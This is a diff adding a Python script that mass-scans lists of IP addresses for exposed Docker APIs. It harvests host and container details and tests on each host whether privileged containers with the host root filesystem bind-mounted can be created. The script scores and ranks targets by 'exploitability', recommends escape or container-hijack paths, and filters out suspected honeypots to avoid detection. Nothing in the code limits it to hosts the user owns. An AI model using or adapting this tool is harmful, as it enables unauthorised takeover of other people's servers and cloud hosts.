@@ -1,0 +1,680 @@
+#!/usr/bin/env python3
+"""
+Docker API Exposure Verification Framework
+Intelligently verifies Docker API exposures with realistic honeypot detection and comprehensive analysis
+"""
+
+import sys
+import csv
+import json
+import time
+import random
+import socket
+import argparse
+import concurrent.futures
+from collections import defaultdict
+from datetime import datetime
+import requests
+from requests.exceptions import RequestException, SSLError, ConnectionError, Timeout
+import ipaddress
+import ssl
+
+# Cloud provider IP ranges (using simplified approach - in production use updated ranges from official sources)
+CLOUD_RANGES = {
+    'AWS': ['18.0.0.0/8', '52.0.0.0/8', '54.0.0.0/8'],
+    'GCP': ['34.0.0.0/8', '35.0.0.0/8', '104.196.0.0/14'],
+    'AZURE': ['52.144.0.0/13', '52.152.0.0/14', '52.160.0.0/13', '52.224.0.0/12'],
+    'DIGITALOCEAN': ['138.197.0.0/16', '165.228.0.0/16', '167.81.0.0/16'],
+    'LINODE': ['173.255.0.0/16', '192.241.0.0/16']
+}
+
+HONEYPOT_SIGNATURES = [
+    'canary', 'honeypot', 'decoy', 'trap', 'security', 'research',
+    'test', 'sandbox', 'mock', 'simulated', 'dummy', 'sensor', 'shodan'
+]
+
+DOCKER_API_INDICATORS = [
+    'Api-Version', 'Docker-Experimental', 'Ostype', 'Server: Docker',
+    'Version', 'Components', 'GitCommit', 'GoVersion'
+]
+
+class DockerAPIVerifier:
+    def __init__(self, max_workers=10, timeout=8, output_file=None, verify_tls=False):
+        self.max_workers = max_workers
+        self.timeout = timeout
+        self.output_file = output_file or f"docker_verification_{datetime.now().strftime('%Y%m%d_%H%M%S')}.csv"
+        self.verify_tls = verify_tls
+        self.verification_results = []
+        self.error_stats = defaultdict(int)
+        self.start_time = None
+        self.port_2375_open = 0
+        self.port_2376_open = 0
+        self.docker_api_detected = 0
+        self.progress_interval = max(1, len(ip_list) // 20) if 'ip_list' in globals() else 10
+
+    def detect_cloud_provider(self, ip):
+        """Detect cloud provider based on IP address"""
+        try:
+            ip_addr = ipaddress.ip_address(ip)
+            for provider, ranges in CLOUD_RANGES.items():
+                for cidr in ranges:
+                    if ip_addr in ipaddress.ip_network(cidr):
+                        return provider
+            return "OTHER"
+        except Exception:
+            return "UNKNOWN"
+
+    def is_honeypot(self, target_data):
+        """Accurate honeypot detection - don't flag empty Docker installations"""
+        # If no info was retrieved, it's likely not a real Docker API
+        if not target_data.get('info_retrieved'):
+            return True
+            
+        # Check hostname for honeypot signatures
+        hostname = target_data.get('hostname', '').lower()
+        if any(sig in hostname for sig in HONEYPOT_SIGNATURES):
+            return True
+            
+        # Check container names for honeypot signatures
+        if target_data.get('container_names'):
+            container_names = [name.lower() for name in target_data['container_names']]
+            if any(any(sig in name for sig in HONEYPOT_SIGNATURES) for name in container_names):
+                return True
+                
+        # Only consider no containers a honeypot indicator if combined with other suspicious factors
+        no_containers = target_data.get('container_count', 0) == 0
+        suspicious_hostname = any(sig in hostname for sig in ['canary', 'decoy', 'trap'])
+        
+        if no_containers and suspicious_hostname:
+            return True
+            
+        return False
+
+    def calculate_exploitability_score(self, target_data):
+        """Calculate realistic exploitability score"""
+        score = 0
+        
+        # Base score from API accessibility
+        if target_data.get('api_accessible'):
+            score += 30
+            
+        # Docker version factors
+        if target_data.get('docker_version'):
+            version_parts = target_data['docker_version'].split('.')
+            if len(version_parts) >= 2:
+                major = int(version_parts[0])
+                minor = int(version_parts[1])
+                if major < 20 or (major == 20 and minor < 10):
+                    score += 20  # Older versions have more known escapes
+        
+        # Security feature deductions
+        if target_data.get('userns_remap'):
+            score -= 10
+        if target_data.get('selinux') == 'Enforcing':
+            score -= 8
+        if target_data.get('apparmor'):
+            score -= 5
+            
+        # Cloud environment bonuses
+        if target_data.get('cloud_provider') in ['AWS', 'GCP', 'AZURE']:
+            score += 15
+            
+        # Host mount opportunities
+        if target_data.get('has_risky_mounts'):
+            score += 25
+            
+        # Container count factor
+        container_count = target_data.get('container_count', 0)
+        if 1 <= container_count <= 5:
+            score += 10  # Few containers = likely important system
+        elif container_count > 10:
+            score += 5   # Many containers = complex environment
+            
+        return max(0, min(100, score))
+
+    def determine_exploitation_path(self, target_data):
+        """Determine the recommended exploitation path with realistic options"""
+        paths = []
+        reasons = []
+        
+        # Check if basic API access works
+        if not target_data.get('api_accessible'):
+            return "API_NOT_ACCESSIBLE", "Docker API not accessible or not present"
+        
+        # Check for host mounts in existing containers
+        if target_data.get('has_risky_mounts') and target_data.get('risky_container_names'):
+            paths.append("HIJACK_EXISTING_CONTAINER")
+            reasons.append(f"Use existing container(s) with host mounts: {', '.join(target_data['risky_container_names'][:2])}")
+        
+        # Check for privileged container capability
+        if target_data.get('can_create_privileged'):
+            if target_data.get('can_mount_host'):
+                paths.append("PRIVILEGED_CONTAINER_ESCAPE")
+                reasons.append("Can create privileged containers with host filesystem mounts")
+            else:
+                paths.append("PRIVILEGED_CONTAINER_NO_MOUNT")
+                reasons.append("Can create privileged containers but host mounts blocked")
+        
+        # Check for standard container creation
+        if target_data.get('can_create_container'):
+            paths.append("STANDARD_CONTAINER_CREATION")
+            reasons.append("Can create standard containers but not privileged")
+        
+        # Check security restrictions
+        restrictions = []
+        if target_data.get('userns_remap'):
+            restrictions.append("User namespace remapping active")
+        if target_data.get('selinux') == 'Enforcing':
+            restrictions.append("SELinux enforcing mode")
+        if target_data.get('apparmor'):
+            restrictions.append("AppArmor profiles active")
+            
+        # Determine primary path
+        if not paths:
+            notes = "No viable exploitation path identified"
+            if restrictions:
+                notes += f" [Restrictions: {', '.join(restrictions[:2])}{'...' if len(restrictions) > 2 else ''}]"
+            return "NO_EXPLOIT_PATH", notes
+        
+        primary_path = paths[0]
+        primary_reason = reasons[0]
+        
+        if restrictions:
+            primary_reason += f" [Restrictions: {', '.join(restrictions[:2])}{'...' if len(restrictions) > 2 else ''}]"
+            
+        return primary_path, primary_reason
+
+    def check_port_open(self, ip, port):
+        """Check if a port is open using socket connection"""
+        try:
+            sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
+            sock.settimeout(self.timeout)
+            result = sock.connect_ex((ip, port))
+            sock.close()
+            return result == 0
+        except:
+            return False
+
+    def verify_docker_api(self, ip, port, use_tls=False):
+        """Verify Docker API on specified port with TLS option"""
+        target_data = {
+            'ip': ip,
+            'port': port,
+            'tls': use_tls,
+            'api_accessible': False,
+            'http_status': None,
+            'info_retrieved': False,
+            'verification_time': 0
+        }
+        
+        start_time = time.time()
+        
+        try:
+            # Build URL based on TLS setting
+            protocol = "https" if use_tls else "http"
+            url = f"{protocol}://{ip}:{port}/version"
+            
+            # Prepare request
+            headers = {'User-Agent': 'Docker-Verify/2.0'}
+            verify = False  # Don't verify TLS certificates
+            
+            # Make request
+            response = requests.get(
+                url, 
+                headers=headers, 
+                timeout=self.timeout,
+                verify=verify
+            )
+            
+            target_data['http_status'] = response.status_code
+            
+            # Check if this looks like a Docker API response
+            has_docker_header = any(ind in response.headers for ind in ['Api-Version', 'Server'])
+            has_docker_content = any(ind in response.text for ind in ['Version', 'ApiVersion', 'Components'])
+            
+            if (200 <= response.status_code < 500) and (has_docker_header or has_docker_content):
+                target_data['api_accessible'] = True
+                
+                # Try to parse version info
+                try:
+                    version_data = response.json()
+                    target_data['docker_version'] = version_data.get('Version', 'unknown')
+                    target_data['api_version'] = version_data.get('ApiVersion', 'unknown')
+                except:
+                    pass
+            else:
+                target_data['error'] = f"Not a Docker API (status={response.status_code})"
+                
+        except SSLError:
+            target_data['error'] = "SSL error"
+            self.error_stats["SSL_ERROR"] += 1
+        except ConnectionError:
+            target_data['error'] = "Connection error"
+            self.error_stats["CONNECTION_ERROR"] += 1
+        except Timeout:
+            target_data['error'] = "Connection timeout"
+            self.error_stats["TIMEOUT"] += 1
+        except RequestException as e:
+            target_data['error'] = f"Request error: {str(e)}"
+            self.error_stats[f"REQUEST_ERROR:{type(e).__name__}"] += 1
+        except Exception as e:
+            target_data['error'] = f"Unexpected error: {str(e)}"
+            self.error_stats[f"GENERAL_ERROR:{type(e).__name__}"] += 1
+        
+        target_data['verification_time'] = round(time.time() - start_time, 2)
+        return target_data
+
+    def get_docker_info(self, ip, port, use_tls=False):
+        """Get detailed Docker information from API"""
+        target_data = {
+            'ip': ip,
+            'port': port,
+            'tls': use_tls,
+            'info_retrieved': False
+        }
+        
+        try:
+            # Build base URL
+            protocol = "https" if use_tls else "http"
+            base_url = f"{protocol}://{ip}:{port}"
+            
+            # Get system info
+            info_response = requests.get(f"{base_url}/info", timeout=self.timeout, verify=False)
+            if info_response.status_code == 200:
+                try:
+                    info = info_response.json()
+                    target_data.update({
+                        'info_retrieved': True,
+                        'hostname': info.get('Name', ''),
+                        'os': info.get('OperatingSystem', 'unknown'),
+                        'kernel_version': info.get('KernelVersion', ''),
+                        'container_count': info.get('Containers', 0),
+                        'running_containers': info.get('ContainersRunning', 0),
+                        'paused_containers': info.get('ContainersPaused', 0),
+                        'stopped_containers': info.get('ContainersStopped', 0),
+                        'image_count': info.get('Images', 0)
+                    })
+                    
+                    # Parse security options
+                    security_options = info.get('SecurityOptions', [])
+                    target_data['userns_remap'] = 'userns' in ' '.join(security_options)
+                    target_data['selinux'] = 'disabled'
+                    target_data['apparmor'] = False
+                    
+                    for opt in security_options:
+                        if 'selinux' in opt:
+                            target_data['selinux'] = opt.split(':')[1] if ':' in opt else 'Enforcing'
+                        if 'apparmor' in opt:
+                            target_data['apparmor'] = True
+                    
+                    # Get container list
+                    containers_response = requests.get(f"{base_url}/containers/json?all=1", 
+                                                    timeout=self.timeout, 
+                                                    verify=False)
+                    if containers_response.status_code == 200:
+                        containers = containers_response.json()
+                        target_data['container_count'] = len(containers)
+                        target_data['container_names'] = [c.get('Names', ['/'])[0].lstrip('/') for c in containers]
+                        
+                        # Check for risky mounts
+                        risky_container_names = []
+                        for container in containers:
+                            mounts = container.get('Mounts', [])
+                            for mount in mounts:
+                                if mount.get('Type') == 'bind' and mount.get('Source', '').startswith('/'):
+                                    risky_container_names.append(container.get('Names', ['/'])[0].lstrip('/'))
+                                    break
+                        
+                        target_data['has_risky_mounts'] = len(risky_container_names) > 0
+                        target_data['risky_container_names'] = risky_container_names[:5]  # Limit to 5
+        
+                except Exception as e:
+                    target_data['error'] = f"Failed to parse Docker info: {str(e)}"
+                    self.error_stats["INFO_PARSING_ERROR"] += 1
+            else:
+                target_data['error'] = f"Failed to get /info (status={info_response.status_code})"
+                
+        except Exception as e:
+            target_data['error'] = f"Failed to retrieve Docker info: {str(e)}"
+            self.error_stats["INFO_RETRIEVAL_ERROR"] += 1
+        
+        return target_data
+
+    def test_exploitation_paths(self, ip, port, use_tls=False):
+        """Test actual exploitation paths on the target"""
+        target_data = {
+            'ip': ip,
+            'port': port,
+            'tls': use_tls,
+            'can_create_container': False,
+            'can_create_privileged': False,
+            'can_mount_host': False
+        }
+        
+        try:
+            # Build base URL
+            protocol = "https" if use_tls else "http"
+            base_url = f"{protocol}://{ip}:{port}"
+            
+            # Test standard container creation
+            container_name = f"verify-{random.randint(1000,9999)}"
+            create_data = {
+                "Image": "alpine",
+                "Cmd": ["echo", "test"],
+                "name": container_name
+            }
+            
+            # Try standard container
+            try:
+                response = requests.post(
+                    f"{base_url}/containers/create",
+                    json=create_data,
+                    timeout=self.timeout,
+                    verify=False
+                )
+                if response.status_code == 201:
+                    # Clean up
+                    requests.delete(f"{base_url}/containers/{container_name}", 
+                                  timeout=self.timeout,
+                                  verify=False)
+                    target_data['can_create_container'] = True
+            except:
+                pass
+            
+            # Try privileged container
+            if target_data['can_create_container']:
+                create_data_priv = {
+                    "Image": "alpine",
+                    "Cmd": ["echo", "test"],
+                    "name": container_name,
+                    "HostConfig": {"Privileged": True}
+                }
+                
+                try:
+                    response = requests.post(
+                        f"{base_url}/containers/create",
+                        json=create_data_priv,
+                        timeout=self.timeout,
+                        verify=False
+                    )
+                    if response.status_code == 201:
+                        # Clean up
+                        requests.delete(f"{base_url}/containers/{container_name}", 
+                                      timeout=self.timeout,
+                                      verify=False)
+                        target_data['can_create_privileged'] = True
+                except:
+                    pass
+            
+            # Test host mount if privileged containers work
+            if target_data['can_create_privileged']:
+                create_data_mount = {
+                    "Image": "alpine",
+                    "Cmd": ["ls", "/host"],
+                    "name": container_name,
+                    "HostConfig": {
+                        "Binds": ["/:/host:ro"],
+                        "Privileged": True
+                    }
+                }
+                
+                try:
+                    response = requests.post(
+                        f"{base_url}/containers/create",
+                        json=create_data_mount,
+                        timeout=self.timeout,
+                        verify=False
+                    )
+                    if response.status_code == 201:
+                        # Clean up
+                        requests.delete(f"{base_url}/containers/{container_name}", 
+                                      timeout=self.timeout,
+                                      verify=False)
+                        target_data['can_mount_host'] = True
+                except:
+                    pass
+                    
+        except Exception as e:
+            target_data['error'] = f"Exploitation test error: {str(e)}"
+            self.error_stats["EXPLOITATION_TEST_ERROR"] += 1
+        
+        return target_data
+
+    def verify_target(self, ip):
+        """Perform comprehensive verification of a single target"""
+        target_data = {'ip': ip, 'timestamp': datetime.now().strftime('%Y-%m-%d %H:%M:%S')}
+        start_time = time.time()
+        
+        # First check if port 2375 is open
+        port_2375_open = self.check_port_open(ip, 2375)
+        if port_2375_open:
+            self.port_2375_open += 1
+        
+        # Check if port 2376 is open (TLS)
+        port_2376_open = self.check_port_open(ip, 2376)
+        if port_2376_open:
+            self.port_2376_open += 1
+        
+        # If neither port is open, skip further verification
+        if not (port_2375_open or port_2376_open):
+            target_data.update({
+                'port_open': False,
+                'api_accessible': False,
+                'verification_time': round(time.time() - start_time, 2)
+            })
+            return target_data
+        
+        # Verify Docker API on port 2375 (non-TLS)
+        api_2375 = None
+        if port_2375_open:
+            api_2375 = self.verify_docker_api(ip, 2375, use_tls=False)
+            if api_2375.get('api_accessible'):
+                self.docker_api_detected += 1
+        
+        # Verify Docker API on port 2376 (TLS) if requested and port is open
+        api_2376 = None
+        if port_2376_open and self.verify_tls:
+            api_2376 = self.verify_docker_api(ip, 2376, use_tls=True)
+            if api_2376.get('api_accessible'):
+                self.docker_api_detected += 1
+        
+        # Determine which API to use (prefer 2375 if available)
+        active_api = None
+        if api_2375 and api_2375.get('api_accessible'):
+            active_api = api_2375
+        elif api_2376 and api_2376.get('api_accessible'):
+            active_api = api_2376
+        
+        # If no accessible API, just record port status
+        if not active_api:
+            target_data.update({
+                'port_open': True,
+                'port_2375_open': port_2375_open,
+                'port_2376_open': port_2376_open,
+                'api_accessible': False,
+                'verification_time': round(time.time() - start_time, 2)
+            })
+            return target_data
+        
+        # Get detailed Docker info
+        docker_info = self.get_docker_info(ip, active_api['port'], active_api['tls'])
+        
+        # Test exploitation paths
+        exploitation_tests = self.test_exploitation_paths(ip, active_api['port'], active_api['tls'])
+        
+        # Combine all data
+        target_data.update(active_api)
+        target_data.update(docker_info)
+        target_data.update(exploitation_tests)
+        target_data['port_open'] = True
+        target_data['port_2375_open'] = port_2375_open
+        target_data['port_2376_open'] = port_2376_open
+        
+        # Add cloud provider info
+        target_data['cloud_provider'] = self.detect_cloud_provider(ip)
+        
+        # Calculate exploitability score
+        target_data['exploitability_score'] = self.calculate_exploitability_score(target_data)
+        
+        # Determine recommended exploitation path
+        target_data['recommended_path'], target_data['path_details'] = self.determine_exploitation_path(target_data)
+        
+        # Check for honeypot
+        target_data['is_honeypot'] = self.is_honeypot(target_data)
+        
+        # Final verification time
+        target_data['verification_time'] = round(time.time() - start_time, 2)
+        
+        return target_data
+
+    def process_results(self):
+        """Process and sort verification results"""
+        # Filter results to only include those with API accessible
+        api_results = [r for r in self.verification_results if r.get('api_accessible')]
+        
+        # Further filter to exclude honeypots
+        valid_results = [r for r in api_results if not r.get('is_honeypot', False)]
+        
+        # Sort by exploitability score (descending)
+        valid_results.sort(key=lambda x: x.get('exploitability_score', 0), reverse=True)
+        
+        return api_results, valid_results
+
+    def save_results(self, all_api_results, valid_results):
+        """Save results to CSV file with comprehensive error reporting"""
+        # Always show error statistics
+        print("\n" + "="*50)
+        print("VERIFICATION SUMMARY")
+        print("="*50)
+        print(f"Total targets processed: {len(self.verification_results)}")
+        print(f"Targets with open Docker ports: {self.port_2375_open + self.port_2376_open}")
+        print(f"  - Port 2375 open: {self.port_2375_open}")
+        print(f"  - Port 2376 open: {self.port_2376_open}")
+        print(f"Docker API detected: {self.docker_api_detected}")
+        print(f"Valid Docker API endpoints: {len(all_api_results)}")
+        print(f"Non-honeypot targets: {len(valid_results)}")
+        
+        if self.error_stats:
+            print("\nERROR BREAKDOWN:")
+            total_errors = sum(self.error_stats.values())
+            for error, count in sorted(self.error_stats.items(), key=lambda x: x[1], reverse=True):
+                print(f"  {error}: {count} ({count/total_errors:.1%})")
+        
+        # Save all results to CSV
+        if self.verification_results:
+            fieldnames = [
+                'ip', 'timestamp', 'port', 'tls', 'api_accessible', 'http_status',
+                'docker_version', 'api_version', 'hostname', 'os', 'kernel_version',
+                'container_count', 'running_containers', 'paused_containers', 'stopped_containers',
+                'image_count', 'userns_remap', 'selinux', 'apparmor', 'has_risky_mounts',
+                'risky_container_names', 'can_create_container', 'can_create_privileged',
+                'can_mount_host', 'cloud_provider', 'exploitability_score',
+                'recommended_path', 'path_details', 'is_honeypot', 'verification_time',
+                'port_2375_open', 'port_2376_open'
+            ]
+            
+            with open(self.output_file, 'w', newline='') as csvfile:
+                writer = csv.DictWriter(csvfile, fieldnames=fieldnames)
+                writer.writeheader()
+                
+                for result in self.verification_results:
+                    # Convert lists to strings for CSV
+                    row = result.copy()
+                    if isinstance(row.get('risky_container_names'), list):
+                        row['risky_container_names'] = ';'.join(row['risky_container_names'])
+                    
+                    # Filter to only include fieldnames
+                    row = {k: v for k, v in row.items() if k in fieldnames}
+                    writer.writerow(row)
+            
+            print(f"\nDetailed results saved to: {self.output_file}")
+            
+            # Show top 5 most exploitable targets
+            if valid_results:
+                print("\nTOP 5 MOST EXPLOITABLE TARGETS:")
+                for i, target in enumerate(valid_results[:5]):
+                    print(f"{i+1}. {target['ip']}: Score={target['exploitability_score']} | Path={target['recommended_path']}")
+                    print(f"   Details: {target['path_details']}")
+        
+        # Show completion stats
+        total_time = time.time() - self.start_time
+        print(f"\nVerification completed in {total_time:.2f} seconds")
+        print(f"Average: {total_time/len(self.verification_results):.2f} seconds per target")
+        
+        return len(valid_results) > 0
+
+    def run(self, ip_list):
+        """Run verification process on list of IPs"""
+        self.start_time = time.time()
+        print(f"Starting Docker API verification on {len(ip_list)} targets")
+        print(f"Using {self.max_workers} concurrent workers")
+        print(f"Connection timeout: {self.timeout} seconds")
+        if self.verify_tls:
+            print("TLS verification enabled (port 2376)")
+        
+        # Process targets with progress tracking
+        with concurrent.futures.ThreadPoolExecutor(max_workers=self.max_workers) as executor:
+            future_to_ip = {executor.submit(self.verify_target, ip): ip for ip in ip_list}
+            
+            completed = 0
+            for future in concurrent.futures.as_completed(future_to_ip):
+                ip = future_to_ip[future]
+                try:
+                    result = future.result()
+                    self.verification_results.append(result)
+                    
+                    # Print progress
+                    completed += 1
+                    if completed % self.progress_interval == 0 or completed == len(ip_list):
+                        sys.stdout.write(f"\rProgress: {completed}/{len(ip_list)} targets verified")
+                        sys.stdout.flush()
+                        
+                except Exception as e:
+                    self.error_stats[f"GENERAL:{type(e).__name__}"] += 1
+                    print(f"\nError verifying {ip}: {str(e)}")
+        
+        # Process and save results
+        all_api_results, valid_results = self.process_results()
+        has_valid_results = self.save_results(all_api_results, valid_results)
+        
+        return has_valid_results
+
+def main():
+    parser = argparse.ArgumentParser(description='Docker API Exposure Verification Framework')
+    parser.add_argument('-i', '--input', required=True, help='Input file with list of IPs (one per line)')
+    parser.add_argument('-o', '--output', help='Output CSV file name')
+    parser.add_argument('-w', '--workers', type=int, default=10, help='Number of concurrent workers (default: 10)')
+    parser.add_argument('-t', '--timeout', type=int, default=8, help='Connection timeout in seconds (default: 8)')
+    parser.add_argument('--tls', action='store_true', help='Verify TLS port 2376 in addition to 2375')
+    
+    args = parser.parse_args()
+    
+    # Read IP list
+    try:
+        with open(args.input, 'r') as f:
+            ip_list = [line.strip() for line in f if line.strip() and not line.startswith('#')]
+        print(f"Loaded {len(ip_list)} IPs from {args.input}")
+    except Exception as e:
+        print(f"Error reading input file: {str(e)}")
+        sys.exit(1)
+    
+    # Run verification
+    verifier = DockerAPIVerifier(
+        max_workers=args.workers,
+        timeout=args.timeout,
+        output_file=args.output,
+        verify_tls=args.tls
+    )
+    
+    success = verifier.run(ip_list)
+    
+    if not success:
+        print("\nNo exploitable Docker APIs found. Common reasons:")
+        print("  - Most FOFA results are false positives (90-95% typical)")
+        print("  - API requires authentication")
+        print("  - Network restrictions block full API access")
+        print("  - Targets are honeypots")
+        print("  - Docker is configured with proper network restrictions")
+
+if __name__ == "__main__":
+    main()
